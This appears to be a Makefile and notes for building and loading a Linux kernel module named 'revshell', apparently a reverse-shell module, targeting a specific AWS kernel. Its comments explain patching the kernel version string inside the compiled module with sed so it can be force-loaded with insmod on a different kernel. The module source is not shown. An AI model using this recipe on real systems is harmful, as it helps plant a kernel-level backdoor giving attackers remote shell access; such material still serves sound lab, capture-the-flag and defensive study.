//Makefile
obj-m +=revshell.o
PWD=$(shell pwd)
all:
    $(MAKE) -C /lib/modules/6.8.0-1030-aws/build M=$(PWD) modules

clean:
    $(MAKE) -C /lib/modules/6.8.0-1030-aws/build M=$(PWD) clean   

//after compiling the ko change the kernel version: $ sed -i 's/6\.8\.0-1030-aws/6.8.0-1031-aws/g' revshell.ko
//and then run $ insmod revshell.ko
